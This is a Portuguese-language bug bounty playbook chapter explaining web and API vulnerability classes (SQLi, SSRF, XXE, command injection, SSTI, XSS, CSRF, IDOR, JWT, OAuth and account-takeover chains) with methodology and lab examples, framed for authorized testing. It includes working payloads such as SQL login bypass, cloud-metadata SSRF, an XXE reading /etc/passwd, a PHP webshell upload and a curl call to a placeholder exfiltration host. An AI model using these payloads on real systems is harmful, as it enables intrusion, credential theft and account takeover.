# 06 — Playbook de Classes de Bug (web + API)

[🏠 Início](../README.md) › [03 · Playbooks](README.md) › Playbook de Classes de Bug

**Sumário:**
- [PARTE A — Classes server-side / injeção](#parte-a--classes-server-side--injeção)
  - [A1. SQLi](#a1-sql-injection-sqli) · [A2. SSRF](#a2-server-side-request-forgery-ssrf) · [A3. XXE](#a3-xml-external-entity-xxe) · [A4. OS Command Injection](#a4-os-command-injection) · [A5. SSTI](#a5-server-side-template-injection-ssti) · [A6. Deserialization](#a6-insecure-deserialization) · [A7. Request Smuggling](#a7-http-request-smuggling) · [A8. File Upload](#a8-file-upload-vulnerabilities) · [A9. Path Traversal / LFI](#a9-path-traversal--lfi)
- [PARTE B — Classes client-side](#parte-b--classes-client-side)
  - [B1. XSS](#b1-cross-site-scripting-xss--reflected-stored-dom) · [B2. Prototype Pollution](#b2-prototype-pollution) · [B3. postMessage](#b3-postmessage-vulnerabilities) · [B4. CSPT](#b4-client-side-path-traversal-cspt) · [B5. DOM Clobbering](#b5-dom-clobbering) · [B6. CSRF](#b6-csrf-cross-site-request-forgery) · [B7. Open Redirect](#b7-open-redirect) · [B8. CORS](#b8-cors-misconfiguration) · [B9. Clickjacking](#b9-clickjacking)
- [PARTE C — Autorização, autenticação e lógica (onde está o dinheiro)](#parte-c--autorização-autenticação-e-lógica-onde-está-o-dinheiro)
  - [C1. IDOR / BOLA](#c1-idor--bola-broken-object-level-authorization) · [C2. BAC / BFLA](#c2-bac--bfla-broken-functionaccess-control) · [C3. Business Logic Flaws](#c3-business-logic-flaws) · [C4. Race Conditions](#c4-race-conditions) · [C5. OAuth / SSO](#c5-oauth--sso-misconfiguration) · [C6. JWT Attacks](#c6-jwt-attacks) · [C7. Password Reset & Auth](#c7-password-reset--authentication-flaws) · [C8. ATO — encadeamento](#c8-account-takeover-ato--encadeamento)

---

> Aprofundamento técnico de cada classe. Estrutura fixa por bug: **essência → como achar → metodologia manual → exemplo → variações/avançado → onde a automação ajuda**. Tudo para uso **autorizado** (releia o [aviso ético](../README.md#-aviso-ético-leia-antes-de-tudo--e-releia-em-cada-fase)). Os exemplos de payload são para **lab** e validação de impacto mínimo em escopo — nunca para causar dano.

> **Como usar:** quando o recon ([motor de recon](../01-recon/recon-engine-ia-e-automacao.md)) te entregar um endpoint, venha aqui, identifique as classes plausíveis pela funcionalidade e siga a metodologia manual. A automação aponta *onde*; este playbook te diz *como quebrar*.

---

## PARTE A — Classes server-side / injeção

---

### A1. SQL Injection (SQLi)

**Essência:** entrada do usuário entra numa query SQL sem sanitização adequada, permitindo alterar a lógica da query (ler dados, autenticar sem senha, em casos extremos RCE).

**Como achar:** qualquer parâmetro que alimente busca, filtro, login, ordenação (`ORDER BY`), paginação. Sinais: erros de SQL no response, mudança de comportamento com `'`/`"`, diferença de tempo com `SLEEP`.

**Metodologia manual:**
1. Insira `'` e observe erro/quebra. Depois `''` (volta ao normal? indica SQLi).
2. Teste lógica booleana: `' AND 1=1-- -` vs `' AND 1=2-- -` (respostas diferentes = blind booleano).
3. Teste tempo: `' AND SLEEP(5)-- -` (delay = blind time-based).
4. Determine número de colunas (`ORDER BY n` / `UNION SELECT NULL,NULL...`).
5. Extraia via `UNION` (in-band) ou inferência (blind).

**Exemplo (lab):**
```sql
-- Bypass de login clássico
' OR '1'='1'-- -
-- UNION para extrair dados (depois de achar nº de colunas)
' UNION SELECT username, password FROM users-- -
-- Time-based (blind), confirma execução
'; IF (1=1) WAITFOR DELAY '0:0:5'-- -
```

**Variações/avançado:** SQLi em `ORDER BY` (sem UNION), em headers (`User-Agent`, `X-Forwarded-For`), second-order (input salvo e usado depois), NoSQL injection (`{"$gt":""}` em MongoDB), out-of-band (DNS/HTTP exfil via Collaborator).

**Automação:** parâmetros candidatos via `gf sqli`; confirmação cuidadosa. **Cuidado:** `sqlmap` é potente, mas em BB use com `--level/--risk` baixos e **só em escopo** — e entenda o que ele faz; nunca mande output bruto.

---

### A2. Server-Side Request Forgery (SSRF)

**Essência:** você faz o servidor enviar requisições para destinos que você controla — alcançando rede interna, metadados de cloud, serviços não expostos.

**Como achar:** funcionalidades que buscam URLs: webhooks, "importar de URL", geração de PDF/thumbnail a partir de link, previews de link, integrações, parâmetros com `http://`, `url=`, `callback=`, `dest=`, `image=`.

**Metodologia manual:**
1. Aponte o parâmetro para um **Burp Collaborator** e veja se chega request (SSRF confirmada, possivelmente blind).
2. Teste alvos internos: `http://127.0.0.1`, `http://localhost`, `http://169.254.169.254/` (metadados cloud).
3. Tente esquemas alternativos: `file://`, `gopher://`, `dict://`.

**Exemplo (lab):**
```http
POST /api/import HTTP/1.1
Content-Type: application/json

{ "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/" }
```

**Variações/avançado:** SSRF cega (use Collaborator), bypass de filtro (IP decimal `2130706433`, IPv6 `[::1]`, redirect 302 para interno, DNS rebinding), SSRF → RCE via gopher para Redis/serviços internos, metadados AWS/GCP/Azure (IMDSv1).

> 🧭 **Ângulo Node** ([lente Orange Tsai 2.1](orange-tsai-decodificado-js.md#21-ssrf-avançado--node-undici-fetch-axios-e-a-inconsistência-parserrequester)): o diferencial **parser vs requester** é nativo. Uma allowlist escrita com `new URL()` (WHATWG) e um `fetch`/`undici`/`axios` que segue **302** para interno = SSRF (TOCTOU). Allowlists por string (`host.endsWith(".alvo.com")`, `url.includes("alvo.com")`) caem com `alvo.com.evil.com`, `alvo.com@evil.com`, `evil.com/alvo.com`. `follow-redirects` já teve falhas de vazamento de header em redirect cross-host. Em **serverless/edge**, o IMDS some, mas surgem metadata do provider e **env com segredos** — SSRF vira leak de env.

**Automação:** parâmetros via `gf ssrf`; injetar URL de Collaborator em massa com `qsreplace` e monitorar callbacks.

---

### A3. XML External Entity (XXE)

**Essência:** parser XML processa entidades externas definidas pelo atacante → leitura de arquivos, SSRF, em casos RCE/DoS.

**Como achar:** qualquer endpoint que aceite XML (upload de `.xml`/`.svg`/`.docx`, SOAP, APIs legadas, `Content-Type: application/xml`).

**Metodologia manual:** envie XML com `DOCTYPE` e entidade externa; observe se o conteúdo do arquivo aparece no response (in-band) ou via Collaborator (out-of-band/blind).

**Exemplo (lab):**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<data>&xxe;</data>
```

**Variações/avançado:** XXE blind (exfil via DTD externo + Collaborator), XXE em SVG/Office/SAML, billion laughs (DoS — **não** usar em prod), XInclude quando não controla o DOCTYPE.

**Automação:** detecção de endpoints XML pelo recon; nuclei tem templates de XXE conhecidos.

---

### A4. OS Command Injection

**Essência:** input chega a uma chamada de shell sem sanitização → execução de comandos no servidor (RCE).

**Como achar:** funcionalidades que rodam binários: ping/traceroute, conversão de imagem/vídeo, geração de PDF, backup, processamento de arquivo.

**Metodologia manual:** injete separadores de comando e observe efeito (output ou delay): `;`, `|`, `&&`, `$(...)`, backticks. Para blind, use delay (`sleep`) ou Collaborator (`nslookup $(whoami).seu-collab`).

**Exemplo (lab):**
```bash
127.0.0.1; id
127.0.0.1 | whoami
$(curl http://SEU-COLLABORATOR)        # exfil blind via OOB
```

**Variações/avançado:** injeção via argumentos (argument injection), via nomes de arquivo, em libs de processamento (ImageMagick "ImageTragick", ffmpeg), bypass de filtro (`${IFS}` no lugar de espaço, concatenação).

**Automação:** parâmetros suspeitos no recon; **muito cuidado** — RCE em prod exige PoC de impacto mínimo (só `id`/`hostname`, nunca destrutivo).

---

### A5. Server-Side Template Injection (SSTI)

**Essência:** input é interpolado num template do servidor (Jinja2, Twig, Freemarker, Velocity...) → de XSS a RCE dependendo do engine.

**Como achar:** onde input aparece renderizado (e-mails, páginas geradas, mensagens customizadas, nomes que voltam na página).

**Metodologia manual:** injete uma expressão matemática e veja se é **avaliada**: `${7*7}`, `{{7*7}}`, `<%= 7*7 %>`. Se voltar `49`, há SSTI. Depois, identifique o engine e escale.

**Exemplo (lab):**
```python
# Jinja2 (Python) — confirma e escala
{{7*7}}
{{config}}
{{''.__class__.__mro__[1].__subclasses__()}}   # caminho clássico para RCE
```

**Variações/avançado:** distinguir SSTI de XSS (avaliação no servidor vs cliente), polyglots para fingerprint de engine, sandbox escapes específicos por engine.

> 🧭 **Engines JS (o pivô).** Menos comum que em Python, mas quando existe é RCE direto — e é um **sink perfeito para gadget de [prototype pollution](#b2-prototype-pollution)**. Fingerprint e escalonamento por engine:
> - **Pug** (ex-Jade): `#{7*7}` avalia; interpolação de código → RCE via `process`/`require` no contexto do template.
> - **EJS**: `<%= 7*7 %>`; opções como `outputFunctionName`/`escapeFunction`/`settings` são vetor clássico (inclusive via prototype pollution) → RCE.
> - **Handlebars**: não avalia JS por padrão, mas cadeias de `constructor`/helpers conhecidas levam a RCE (pesquisa pública de gadget chains).
> - **Nunjucks**: `{{7*7}}`; ambiente com autoescape off + acesso a `range`/`cycler`/globals → RCE.
> - **Detecção:** injete `{{7*7}}`, `#{7*7}`, `<%= 7*7 %>` e veja qual retorna `49`; isso já revela o engine.

**Onde treinar / caçar:** labs de SSTI da PortSwigger + challenges de CTF web JS → no bounty: e-mails/páginas geradas, mensagens customizadas, qualquer input renderizado por template server-side em app Node.

**Automação:** [tplmap](https://github.com/epinna/tplmap) para confirmação (use com cautela e em escopo).

---

### A6. Insecure Deserialization

**Essência:** dados serializados controlados pelo atacante são desserializados → manipulação de objetos, em casos RCE.

**Como achar:** cookies/tokens/params com blobs serializados (base64 que decodifica para objeto Java/PHP/Python/.NET, ou JSON com tipos), `Content-Type` de serialização.

**Metodologia manual:** identifique o formato (Java `rO0`, PHP `O:`, Python pickle), entenda o que é desserializado, busque "gadget chains" conhecidas.

**Exemplo (conceito):**
```php
// PHP — objeto malicioso explorando __wakeup/__destruct
O:8:"Exemplo":1:{s:3:"cmd";s:7:"id;uname";}
```

**Variações/avançado:** ysoserial (Java) e phpggc (PHP) para gadget chains, .NET ViewState, Python pickle RCE, Ruby Marshal. PoC sempre **local/lab**; em prod, impacto mínimo.

> 🧭 **No mundo JS** ([lente Orange Tsai 2.6](orange-tsai-decodificado-js.md#26-desserialização-e-execução--node-serialize-vm2-prototype-pollution)):
> - **`node-serialize` (CVE-2017-5941):** `unserialize()` reconstrói funções marcadas com `_$$ND_FUNC$$_`; um **IIFE** embutido executa na desserialização → RCE. `funcster` tem risco análogo.
> - **`vm`/`vm2` sandbox escape:** o `vm` do Node **não é** sandbox de segurança; o `vm2` foi **descontinuado (jul/2023)** após escapes irrecuperáveis (**CVE-2023-37466**, **CVE-2023-37903**, CVSS 9.8 → RCE). Procure `vm2` no `package-lock.json` de apps que rodam "fórmula/expressão/plugin do usuário". Migração: `isolated-vm`.
> - **A ponte com [prototype pollution](#b2-prototype-pollution):** muitos RCEs em Node não vêm de "desserialização" clássica, e sim de **PP → gadget** que termina num sink de execução — a mesma família.

**Automação:** detecção de blobs serializados no recon; nuclei para padrões conhecidos (ViewState etc.).

---

### A7. HTTP Request Smuggling

**Essência:** front-end e back-end discordam sobre onde termina uma request (divergência `Content-Length` vs `Transfer-Encoding`, ou HTTP/2→/1 downgrade) → "contrabandear" uma request dentro de outra.

**Como achar:** arquiteturas com proxy/CDN + origem (quase toda app grande). Sinais: timing anômalo, respostas trocadas entre usuários.

**Metodologia manual:** teste variantes CL.TE, TE.CL, TE.TE e desync de HTTP/2 com a extensão **HTTP Request Smuggler** (de James Kettle) no Burp; valide com timing.

**Exemplo (conceito CL.TE):**
```http
POST / HTTP/1.1
Content-Length: 6
Transfer-Encoding: chunked

0

G   <- "G" fica no buffer e prefixa a próxima request da vítima
```

**Variações/avançado:** H2.CL / H2.TE desync, request tunnelling, cache poisoning via smuggling, [research do James Kettle](https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn). É avançado — domine depois das classes base.

> 🧭 **Node por trás do proxy** ([lente Orange Tsai 2.3](orange-tsai-decodificado-js.md#23-http-request-smuggling--desync--llhttp-e-o-node-por-trás-do-proxy)): o parser HTTP do Node é o **`llhttp`**. Desync surge quando o front (CDN/nginx/HAProxy) e o `llhttp` discordam do fim da mensagem (tolerâncias de `chunked`/whitespace) ou na tradução **HTTP/2→HTTP/1**. Sinal de escopo: **muito delicado** — a PoC pode afetar outros usuários; confirme por timing e domine em lab antes de tocar produção.

**Automação:** HTTP Request Smuggler (Burp) automatiza a detecção; a confirmação e a exploração são manuais e delicadas (risco de afetar outros usuários — cuidado com escopo).

---

### A8. File Upload Vulnerabilities

**Essência:** upload mal validado → de RCE (webshell) a XSS (SVG/HTML), path traversal, ou SSRF.

**Como achar:** qualquer upload (avatar, documento, anexo, import).

**Metodologia manual:**
1. Tente extensões executáveis (`.php`, `.jsp`, `.aspx`) e variações de bypass (`.php.jpg`, `.pHp`, null byte legado, dupla extensão).
2. Manipule `Content-Type` e magic bytes.
3. Teste SVG/HTML para XSS stored; teste path traversal no nome (`../../`).

**Exemplo (lab):**
```http
Content-Disposition: form-data; name="file"; filename="shell.php.jpg"
Content-Type: image/jpeg

<?php system($_GET['c']); ?>
```

**Variações/avançado:** XSS via SVG, XXE via SVG/Office, ImageTragick via imagem, sobrescrever arquivos via path traversal no filename, RCE via descompactação (zip slip).

**Automação:** recon acha endpoints de upload; o teste é manual e criativo.

---

### A9. Path Traversal / LFI

**Essência:** input usado para montar caminho de arquivo sem normalização → ler arquivos arbitrários (LFI) ou, com inclusão, executar código.

**Como achar:** parâmetros que referenciam arquivos: `file=`, `path=`, `template=`, `download=`, `lang=`, `page=`.

**Metodologia manual:** injete `../` (e variações encodadas `%2e%2e%2f`, `....//`, absolute path) mirando arquivos conhecidos (`/etc/passwd`, `C:\Windows\win.ini`, configs da app).

**Exemplo (lab):**
```http
GET /download?file=../../../../etc/passwd HTTP/1.1
GET /page?name=....//....//etc/passwd HTTP/1.1     # bypass de filtro simples
```

**Variações/avançado:** LFI → RCE (log poisoning, PHP wrappers `php://filter`, `data://`), traversal em ZIP/upload, em parâmetros de API que servem arquivos.

**Automação:** `gf lfi`/payloads de traversal em massa com `qsreplace`; nuclei para padrões conhecidos.

---

## PARTE B — Classes client-side

---

### B1. Cross-Site Scripting (XSS) — reflected, stored, DOM

**Essência:** injeção de JS que executa no navegador da vítima → roubo de sessão, ações em nome do usuário, ATO.

**Tipos:** **reflected** (input volta na resposta imediata), **stored** (input salvo e servido a outros), **DOM** (sink no JS do cliente, sem passar pelo servidor — veja [Fundação + Web (F2)](../02-trilha/01-fundacao-e-web-f0-f2.md)).

**Metodologia manual:**
1. Injete um marcador único (`cabum123`) e veja **onde** e **como** reflete (HTML body? atributo? script? URL?).
2. Quebre o contexto: dentro de atributo (`"><svg onload=...>`), dentro de script (`</script><svg...>`), em `href` (`javascript:`).
3. Para DOM XSS: trace source→sink no JS (DOM Invader acelera).

**Exemplo (lab):**
```html
<svg onload=alert(document.domain)>
"><img src=x onerror=alert(1)>
javascript:alert(1)        <!-- em sinks de URL -->
```

**Variações/avançado:** filter bypass (case, encoding, sem parênteses), mutation XSS (mXSS), XSS via SVG/markdown, CSP bypass (JSONP, gadgets, `nonce` reuse), blind XSS (payload que dispara num painel admin — use [XSS Hunter](https://github.com/mandatoryprogrammer/xsshunter-express)/Collaborator).

**Automação:** `gf xss` para candidatos; reflexão em massa; **mas a confirmação de execução e o bypass de contexto são manuais**.

---

### B2. Prototype Pollution

**Essência:** poluir `Object.prototype` em JS (cliente ou Node) injetando `__proto__`/`constructor.prototype` → de DoS a XSS (client) a RCE (server, via gadget).

**Como achar:** merge de objetos, parsing de query string para objeto, `Object.assign` recursivo, libs vulneráveis (lodash antigo, etc.).

**Metodologia manual (client):** injete `?__proto__[x]=y` ou JSON `{"__proto__":{"x":"y"}}` e cheque se `Object.prototype.x` foi setado no console. Depois, encontre um **gadget** que use essa propriedade poluída para virar XSS.

**Exemplo (lab):**
```javascript
// Polui o protótipo
?__proto__[onerror]=alert(1)
// Confirmação no console
Object.prototype.polluted = true; ({}).polluted   // true => poluível
```

**Variações/avançado:** server-side prototype pollution (SSPP) → RCE em Node, gadgets em templates/parsers, [pesquisa de Gareth Heyes / PortSwigger](https://portswigger.net/research/server-side-prototype-pollution).

> 🧭 **A classe-assinatura do ecossistema JS** ([lente Orange Tsai 2.6](orange-tsai-decodificado-js.md#26-desserialização-e-execução--node-serialize-vm2-prototype-pollution)). Vale dominar a fundo:
> - **Fontes de poluição** (por onde entra): deep-merge de body/config (`_.merge`/`_.defaultsDeep` antigos, merges recursivos caseiros), parsing de query com `qs` (`?__proto__[x]=y`, `?constructor[prototype][x]=y`), `Object.assign` profundo, `JSON.parse` + merge. Chaves-veneno: `__proto__`, `constructor.prototype`.
> - **Client-side → DOM XSS:** ache um **gadget** — uma propriedade poluível que um sink lê (config de sanitizer, `srcdoc`, `src`, template do framework). Poluir `Object.prototype` muda o *default* que o código assume.
> - **Server-side (SSPP) → RCE:** *Silent Spring* (USENIX Security 2023 / DEF CON 31, KTH) mapeou **11 gadgets universais** em APIs core do Node (opções default que acabam em `child_process.spawn`/`require`/template) → RCE em NPM CLI, Parse Server, Rocket.Chat. Detecção **black-box sem DoS** (Heyes): polua uma prop que muda a resposta observável (status/JSON/header) sem derrubar o serviço.
> - **Bypass/EoP:** poluir `isAdmin`/`role`/flags de config que outro trecho lê como default.

**Onde treinar / caçar:** labs de prototype pollution da [PortSwigger](https://portswigger.net/web-security/prototype-pollution) e challenges de CTF (é quase um gênero próprio) → no bounty: endpoints que fazem deep-merge do body, apps com lodash desatualizado, config JSON. Gadgets prontos: [KTH-LangSec/server-side-prototype-pollution](https://github.com/KTH-LangSec/server-side-prototype-pollution).

**Automação:** [DOM Invader](https://portswigger.net/burp/documentation/desktop/tools/dom-invader) detecta prototype pollution client-side automaticamente; server-side é semi-manual (técnica black-box do Heyes).

---

### B3. postMessage Vulnerabilities

**Essência:** handlers de `window.postMessage` que confiam na origem errada ou usam o dado em sink perigoso → XSS cross-origin, vazamento de dados.

**Como achar:** procure `addEventListener("message", ...)` no JS; veja se valida `event.origin` e o que faz com `event.data`.

**Metodologia manual:** monte uma página atacante que abre/embeda o alvo e envia `postMessage`; verifique se o handler aceita sua origem e leva o dado a um sink (`innerHTML`, `eval`, redirect).

**Exemplo (conceito):**
```javascript
// Página atacante
target.postMessage('<img src=x onerror=alert(document.domain)>', '*');
```

**Variações/avançado:** falta de checagem de origin, checagem fraca (`indexOf`/`startsWith` burlável), dado usado em `location`/`innerHTML`. Referência: [Securitum](https://research.securitum.com/postmessage-xss/).

**Automação:** DOM Invader tem módulo de postMessage; ainda assim, valide manualmente.

---

### B4. Client-Side Path Traversal (CSPT)

**Essência:** o **cliente** monta uma URL/path de API a partir de input, e `../` redireciona a chamada para outro endpoint → pode virar CSRF/IDOR amplificado, exfiltração.

**Como achar:** quando o front constrói paths de API dinamicamente a partir de valores controláveis (parâmetros de rota, fragmentos).

**Metodologia manual:** injete `../` no valor que compõe o path da chamada fetch/XHR e veja se a requisição vai para um endpoint diferente; encadeie com um sink (ex.: CSPT→CSRF). Referência: [Doyensec CSPT](https://blog.doyensec.com/2023/06/13/cspt.html).

**Automação:** detecção é majoritariamente manual (leitura de JS + observação de requests).

---

### B5. DOM Clobbering

**Essência:** injetar HTML (sem script) cujos `id`/`name` "clobberam" variáveis globais do JS, alterando o fluxo → habilita XSS onde script direto é bloqueado.

**Como achar:** apps que permitem HTML limitado (sanitizers) e cujo JS lê propriedades de `window`/`document` que podem ser sobrescritas por elementos nomeados.

**Exemplo (conceito):**
```html
<a id="config"><a id="config" name="url" href="javascript:alert(1)">
```

**Automação:** manual; conhecimento de gadgets ([DOM Clobbering wiki](https://github.com/wisec/domxsswiki/wiki/Dom-clobbering)).

---

### B6. CSRF (Cross-Site Request Forgery)

**Essência:** forçar a vítima autenticada a executar uma ação sem intenção (sem token anti-CSRF ou com `SameSite` fraco).

**Como achar:** ações que mudam estado (POST/PUT/DELETE) sem token CSRF, ou que aceitam o token de outra sessão, ou GET que altera estado.

**Metodologia manual:** remova/altere o token e veja se a ação ainda ocorre; teste `SameSite` (cookie sem `SameSite=Lax/Strict`); monte uma PoC HTML que dispara a ação.

**Exemplo (lab):**
```html
<form action="https://alvo/email/change" method="POST">
  <input name="email" value="atacante@evil.com">
</form><script>document.forms[0].submit()</script>
```

**Variações/avançado:** CSRF em JSON (Content-Type tricks), bypass de token (token não validado, previsível, ou refletido), login CSRF, encadeamento CSRF→ATO.

**Automação:** Burp gera PoC de CSRF; a avaliação de impacto é manual.

---

### B7. Open Redirect

**Essência:** redirect baseado em input não validado → phishing, e como **gadget** em cadeias (SSRF, OAuth token leak).

**Como achar:** parâmetros `redirect=`, `next=`, `url=`, `returnTo=`, `dest=`, fluxos de login/logout.

**Metodologia manual:** aponte para domínio externo (`//evil.com`, `https://evil.com`, `https:evil.com`) e veja se redireciona; teste bypasses (`/\evil.com`, `@`, encoding).

**Variações/avançado:** open redirect → roubo de token OAuth (`redirect_uri`), → SSRF, → XSS via `javascript:`.

**Automação:** `gf redirect` + payloads em massa.

---

### B8. CORS Misconfiguration

**Essência:** `Access-Control-Allow-Origin` que reflete a origem do atacante com `Allow-Credentials: true` → ler dados autenticados cross-origin.

**Como achar:** envie `Origin: https://evil.com` e veja se volta refletido em `ACAO` com credentials true.

**Exemplo (teste):**
```http
GET /api/me HTTP/1.1
Origin: https://evil.com
-- resposta vulnerável:
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
```

**Variações/avançado:** reflexão de origin, `null` origin aceito, regex fraca (`evil-alvo.com`), subdomínio confiável comprometível.

**Automação:** nuclei e scripts de CORS; valide o impacto manualmente (precisa de endpoint com dado sensível + credentials).

---

### B9. Clickjacking

**Essência:** enquadrar o alvo em iframe transparente e enganar cliques → ações sensíveis. Geralmente baixo impacto, salvo em ações críticas sem confirmação.

**Como achar:** ausência de `X-Frame-Options`/`frame-ancestors` em páginas com ações sensíveis. PoC com iframe.

**Automação:** trivial de detectar (headers); só reporte com impacto real.

---

## PARTE C — Autorização, autenticação e lógica (onde está o dinheiro)

> 🎯 **Caçador manual?** Esta parte cobre *cada classe*; para operar como **especialista em autorização/lógica** (modelagem do sistema, matriz de teste, padrões avançados de IDOR/BFLA, taxonomia de logic flaws, encadeamento), veja o playbook dedicado [Caçador Manual — Autorização e Lógica](manual-autorizacao-e-logica.md).

---

### C1. IDOR / BOLA (Broken Object Level Authorization)

**Essência:** acessar/alterar objetos de outros usuários trocando um identificador, sem checagem de dono. **A classe mais comum e mais paga.**

**Como achar:** qualquer request com ID de objeto (`/user/123`, `?order_id=`, `uuid`, em body ou path). Funciona em web e API.

**Metodologia manual:**
1. Crie **duas contas** (A e B).
2. Capture um request de A que acessa um objeto de A.
3. Troque o ID para o de B (no Repeater). Se retornar dados de B → IDOR/BOLA.
4. Use **Autorize** (Burp) para automatizar a comparação entre as duas sessões.

**Exemplo (lab):**
```http
GET /api/v1/orders/1002 HTTP/1.1     # 1002 é do usuário B
Authorization: Bearer <token_do_usuario_A>
-- se retorna o pedido de B, é BOLA
```

**Variações/avançado:** IDs previsíveis vs UUIDs (UUID vazado em outro endpoint), IDOR em massa (enumeração — **com cautela e impacto mínimo**), IDOR de escrita (alterar/deletar dado alheio), IDOR via parâmetro escondido (arjun), blind IDOR (efeito sem retorno direto).

**Automação:** recon acha os endpoints com IDs; **a validação de autorização é manual** (duas sessões + Autorize). É o exemplo perfeito da metodologia 2026.

---

### C2. BAC / BFLA (Broken Function/Access Control)

**Essência:** acessar **funções** que seu papel não deveria poder (endpoint de admin como user comum, método HTTP não permitido).

**Como achar:** endpoints administrativos descobertos no recon/JS, painéis, ações privilegiadas.

**Metodologia manual:**
1. Como user comum, chame endpoints de admin (force browsing dos paths achados no recon).
2. Troque o verbo HTTP (`GET`→`POST`/`PUT`/`DELETE`).
3. Remova/altere headers de papel (`X-Role`, `X-Admin`).
4. Confirme que a ação privilegiada ocorreu.

**Exemplo (lab):**
```http
DELETE /api/admin/users/55 HTTP/1.1
Authorization: Bearer <token_de_user_comum>
-- se deleta, é BFLA
```

**Variações/avançado:** vertical (user→admin) vs horizontal (user→user), bypass por método, por path case (`/Admin`), por header, por parâmetro (`?admin=true`).

**Automação:** recon mapeia funções/endpoints; validação manual com múltiplos papéis.

---

### C3. Business Logic Flaws

**Essência:** abusar das **regras de negócio** — não há "payload", há raciocínio. Onde o caçador humano é insubstituível.

**Como achar:** entenda o fluxo de negócio e pergunte: *"o que essa funcionalidade deveria impedir, e como eu quebro essa regra?"*

**Exemplos de vetores:**
- Preço/quantidade negativos (carrinho com `-1` que credita saldo).
- Pular etapas de um fluxo (ir direto ao "pagamento confirmado" sem pagar).
- Reuso/abuso de cupom, indicação, trial.
- Manipular moeda/decimais/arredondamento.
- Condições de corrida em limites (ver C4).
- Burlar limites de uso/quota.

**Metodologia manual:** mapeie o fluxo no Burp, identifique cada validação implícita, e teste quebrá-las uma a uma. Pense como quem quer "trapacear" o sistema.

**Automação:** quase nula — é a fronteira humana. IA ajuda a **brainstormar** vetores a partir da descrição do fluxo ([motor de recon](../01-recon/recon-engine-ia-e-automacao.md)).

---

### C4. Race Conditions

**Essência:** explorar a janela entre verificação e uso (TOCTOU) enviando requests simultâneas → resgatar algo limitado mais de uma vez (saldo, cupom, voto, convite).

**Como achar:** ações com limite/saldo/estado único: saque, transferência, resgate de cupom, "uma vez por conta".

**Metodologia manual:** use **Turbo Intruder** com **single-packet attack** (envia múltiplas requests num único pacote TCP, eliminando jitter de rede) ou o "Send group in parallel" do Repeater. Referência: [Smashing the state machine (James Kettle)](https://portswigger.net/research/smashing-the-state-machine).

**Exemplo (conceito):** disparar 20x o resgate de um cupom de uso único simultaneamente; se creditar 20x, há race.

**Automação:** Turbo Intruder é a ferramenta; a identificação do alvo e a interpretação são manuais.

---

### C5. OAuth / SSO Misconfiguration

**Essência:** falhas nos fluxos OAuth 2.0/OIDC → roubo de conta, vazamento de token.

**Como achar:** fluxos de "login com Google/GitHub/etc.", parâmetros `redirect_uri`, `state`, `code`, `response_type`.

**Vetores comuns:**
- `redirect_uri` mal validado → exfiltrar `code`/token para domínio do atacante (combina com open redirect).
- Falta/validação fraca de `state` → CSRF no fluxo (account linking).
- `code`/token vazando via Referer.
- Confusão de `response_type` (implicit vs code).
- Pre-account takeover (vincular conta antes da vítima confirmar e-mail).

**Metodologia manual:** mapeie o fluxo inteiro no Burp, manipule cada parâmetro, teste cada validação.

**Automação:** manual; conhecimento dos fluxos é essencial.

---

### C6. JWT Attacks

**Essência:** abusar de tokens JWT mal validados → forjar identidade/papel.

**Como achar:** tokens com 3 partes base64 (`xxx.yyy.zzz`) em `Authorization`/cookies.

**Vetores comuns:**
- `alg: none` aceito (sem assinatura).
- Algorithm confusion (RS256→HS256, usando a chave pública como segredo HMAC).
- Segredo HMAC fraco (brute force offline com [jwt_tool](https://github.com/ticarpi/jwt_tool)).
- `kid` injection (path/SQLi via header `kid`).
- Claims não validados (`exp`, `aud`, `iss`), troca de `role`/`sub`.

**Exemplo (lab):**
```bash
# Brute do segredo HMAC e forja de token
jwt_tool eyJ... -C -d wordlist.txt
jwt_tool eyJ... -T              # tamper interativo (troca claims)
```

**Automação:** JWT Editor (Burp) e jwt_tool; a estratégia é manual.

---

### C7. Password Reset & Authentication Flaws

**Essência:** falhas no fluxo de auth/reset → tomada de conta.

**Vetores comuns:**
- Host header poisoning no link de reset (link aponta para domínio do atacante).
- Token de reset previsível/sem expiração/reutilizável.
- Reset que não invalida sessões antigas.
- OTP sem rate limit (brute) ou vazado na resposta.
- User enumeration (mensagens/timing diferentes).
- Response manipulation (trocar `"success":false`→`true`, status 401→200).

**Metodologia manual:** percorra o fluxo inteiro, manipule headers (`Host`, `X-Forwarded-Host`), tokens e respostas.

**Automação:** detecção de endpoints no recon; teste manual.

---

### C8. Account Takeover (ATO) — encadeamento

**Essência:** o "boss final" — combinar bugs menores numa cadeia que resulta em tomada de conta (o que maximiza severidade e payout).

**Cadeias comuns:**
- Open redirect + OAuth `redirect_uri` → roubo de token → ATO.
- IDOR em "alterar e-mail" sem confirmação → ATO.
- Host header poisoning no reset → ATO.
- XSS + roubo de sessão → ATO.
- Pre-account takeover via SSO.

**Mentalidade:** sempre pergunte *"como esse bug médio vira ATO se eu encadear com outro?"*. Caçadores top pensam em **cadeias**, não em bugs isolados.

**Automação:** a cadeia é raciocínio humano puro; cada elo pode ter sido encontrado com ajuda da automação.

---

> **Fechamento do playbook:** note o padrão — **server-side e client-side** têm payloads e ferramentas que a automação ajuda a disparar; **autorização e lógica** (Parte C) são quase 100% humanas e é onde mora o dinheiro. A metodologia 2026 brilha exatamente aqui: a máquina te leva rápido até os endpoints; **você** faz as perguntas de autorização e lógica que nenhum scanner faz.

---

⬅️ [Anterior: Arsenal · Labs · Checklists · Ética](../05-referencia/arsenal-labs-checklists-etica.md) · [⬆️ Topo](#) · [Próximo: Recon Contínuo + API Avançado ➡️](../01-recon/recon-continuo-e-api-avancado.md)
